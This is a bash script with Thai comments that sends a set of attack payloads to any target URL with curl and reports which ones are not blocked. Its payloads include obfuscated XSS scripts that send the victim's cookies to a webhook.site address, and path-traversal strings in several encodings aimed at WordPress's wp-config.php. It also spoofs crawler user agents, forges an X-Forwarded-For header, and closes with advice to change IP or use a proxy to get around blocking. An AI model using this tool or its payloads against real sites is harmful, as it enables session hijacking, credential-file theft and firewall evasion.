#!/bin/bash

# Payload Tester using curl
# ทดสอบ payload แบบรวดเร็วด้วย curl

TARGET_URL="$1"

if [ -z "$TARGET_URL" ]; then
    echo "Usage: $0 <target_url>"
    echo "Example: $0 https://example.com"
    exit 1
fi

# ตรวจสอบ URL
if [[ ! "$TARGET_URL" =~ ^https?:// ]]; then
    TARGET_URL="https://$TARGET_URL"
fi

echo "[+] ทดสอบ payload แบบรวดเร็วสำหรับ: $TARGET_URL"
echo "=================================================="

# Payloads ที่ทดสอบ
PAYLOADS=(
    # XSS Cookie Stealing (URL encoded)
    "%3Cscript%3Evar%20c%3DString.fromCharCode(99,111,111,107,105,101);var%20d%3DString.fromCharCode(100,111,99,117,109,101,110,116);var%20l%3DString.fromCharCode(108,111,99,97,116,105,111,110);var%20a%3D'https%3A%2F%2Fwebhook.site%2F128fa6c2-fe85-4a6c-b522-0346f6aae885'%3Bwindow%5Bd%5D%5Bl%5D%20%3D%20a%20%2B%20'/?c%3D'%20%2B%20encodeURIComponent(window%5Bd%5D%5Bc%5D)%3B%3C%2Fscript%3E"
    
    # Path Traversal
    "../../../../../../wp-config.php"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwp-config.php"
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwp-config.php"
    
    # Alternative XSS
    "%3Cscript%3Evar%20a%3D'https%3A%2F%2Fwebhook.site%2F128fa6c2-fe85-4a6c-b522-0346f6aae885'%3Bdocument.location%3Da%20%2B%20'/?c%3D'%20%2B%20encodeURIComponent(document.cookie)%3B%3C%2Fscript%3E"
)

# Bypass User-Agents
USER_AGENTS=(
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
)

# Test endpoints
ENDPOINTS=(
    "/search?q="
    "/index.php?page="
    "/file?path="
)

SUCCESSFUL_TESTS=0
TOTAL_TESTS=0

echo "Payloads ที่จะทดสอบ: ${#PAYLOADS[@]}"
echo "User-Agents ที่จะทดสอบ: ${#USER_AGENTS[@]}"
echo "Endpoints ที่จะทดสอบ: ${#ENDPOINTS[@]}"
echo ""

for ((i=0; i<${#PAYLOADS[@]}; i++)); do
    PAYLOAD="${PAYLOADS[$i]}"
    echo "[$((i+1))/${#PAYLOADS[@]}] ทดสอบ payload: ${PAYLOAD:0:50}..."
    
    for ENDPOINT in "${ENDPOINTS[@]}"; do
        for USER_AGENT in "${USER_AGENTS[@]}"; do
            TOTAL_TESTS=$((TOTAL_TESTS + 1))
            
            TEST_URL="${TARGET_URL}${ENDPOINT}${PAYLOAD}"
            
            echo "  [-] ทดสอบ: ${ENDPOINT} (UA: ${USER_AGENT:0:30}...)"
            
            # ทดสอบด้วย curl
            RESPONSE=$(curl -s -w "%{http_code}" -o /tmp/response_$$ \
                -H "User-Agent: $USER_AGENT" \
                -H "X-Forwarded-For: 127.0.0.1" \
                -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
                --connect-timeout 10 \
                --max-time 15 \
                "$TEST_URL")
            
            HTTP_CODE="${RESPONSE: -3}"
            RESPONSE_CONTENT=$(cat /tmp/response_$$)
            rm -f /tmp/response_$$
            
            # ตรวจสอบว่าถูกบล็อกหรือไม่
            IS_BLOCKED=false
            if echo "$RESPONSE_CONTENT" | grep -qi "cloudflare\|403 forbidden\|attention required\|sorry, you have been blocked"; then
                IS_BLOCKED=true
            fi
            
            if [ "$HTTP_CODE" = "200" ] && [ "$IS_BLOCKED" = false ]; then
                echo "    [+] สำเร็จ! Status: $HTTP_CODE, Length: ${#RESPONSE_CONTENT}"
                echo "        URL: $TEST_URL"
                echo "        User-Agent: $USER_AGENT"
                echo "        Response Preview: ${RESPONSE_CONTENT:0:100}..."
                SUCCESSFUL_TESTS=$((SUCCESSFUL_TESTS + 1))
            else
                echo "    [-] ถูกบล็อกหรือไม่สำเร็จ (Status: $HTTP_CODE)"
            fi
            
            sleep 1  # Delay
        done
    done
    echo ""
done

echo "=================================================="
echo "สรุปผลการทดสอบ:"
echo "การทดสอบทั้งหมด: $TOTAL_TESTS"
echo "การทดสอบที่สำเร็จ: $SUCCESSFUL_TESTS"
echo ""

if [ $SUCCESSFUL_TESTS -gt 0 ]; then
    echo "[+] พบ $SUCCESSFUL_TESTS การทดสอบที่สำเร็จ!"
    echo "   ใช้ข้อมูลเหล่านี้สำหรับการทดสอบเพิ่มเติม"
else
    echo "[-] ไม่พบการทดสอบที่สำเร็จ"
    echo "   ลองใช้เทคนิคอื่นๆ หรือตรวจสอบการเชื่อมต่อ"
fi

echo ""
echo "คำแนะนำเพิ่มเติม:"
echo "1. ลองใช้ proxy หรือ VPN"
echo "2. เปลี่ยน IP address"
echo "3. ใช้เครื่องมืออื่นๆ เช่น Burp Suite"
echo "4. ทดสอบในเวลาที่แตกต่างกัน"